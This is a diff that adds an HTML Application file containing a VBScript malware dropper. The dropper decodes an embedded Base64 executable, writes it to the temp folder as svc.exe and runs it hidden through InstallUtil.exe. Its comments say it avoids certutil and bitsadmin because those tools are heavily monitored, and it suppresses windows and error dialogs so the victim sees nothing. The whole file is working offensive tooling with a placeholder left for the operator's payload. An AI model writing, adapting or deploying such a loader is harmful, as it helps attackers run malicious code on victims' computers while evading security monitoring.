@@ -1,0 +1,67 @@
+<html>
+<head>
+<title> </title>
+<HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
+<script language="VBScript">
+  ' =============================================================================
+  ' Self-Decode HTA Loader
+  '
+  ' Decodes an embedded Base64 payload and executes it via InstallUtil.exe /U
+  ' without using bitsadmin or certutil (both heavily monitored LOLBins).
+  '
+  ' Delivery: embed the Base64-encoded loader.exe directly in the b64 variable below.
+  ' =============================================================================
+
+  ' ── PLACEHOLDER: Replace this with your Base64-encoded loader.exe ────────────
+  Dim b64 : b64 = "TVqQAAMAAAAEAAAA..."
+
+  On Error Resume Next
+
+  ' Decode Base64 → binary
+  Dim bytes : bytes = DecodeBase64(b64)
+  If Err.Number <> 0 Then Call Fail("Decode failed: " & Err.Description)
+
+  ' Write to %TEMP%\svc.exe
+  Dim fso, tmpPath
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  tmpPath = fso.GetSpecialFolder(2) & "\svc.exe"
+  WriteBinary tmpPath, bytes
+  If Err.Number <> 0 Then Call Fail("Write failed: " & Err.Description)
+
+  ' Execute via InstallUtil
+  Dim installUtil
+  installUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
+  CreateObject("WScript.Shell").Run installUtil & " /U " & tmpPath, 0, False
+
+  ' Close the HTA window
+  self.close()
+
+  ' ── Helpers ─────────────────────────────────────────────────────────────────
+
+  ' Decode Base64 string to byte array using MSXML2 (no certutil needed)
+  Function DecodeBase64(s)
+    Dim xml : Set xml = CreateObject("MSXML2.DOMDocument")
+    Dim el : Set el = xml.createElement("b")
+    el.dataType = "bin.base64"
+    el.text = s
+    DecodeBase64 = el.nodeTypedValue
+  End Function
+
+  ' Write a byte array to disk using ADODB.Stream (no certutil needed)
+  Sub WriteBinary(path, data)
+    Dim stream : Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1  ' adTypeBinary
+    stream.Open
+    stream.Write data
+    stream.SaveToFile path, 2  ' adSaveCreateOverWrite
+    stream.Close
+  End Sub
+
+  Sub Fail(msg)
+    ' Silent fail — no error dialogs
+    self.close()
+  End Sub
+</script>
+</head>
+<body>Loading...</body>
+</html>
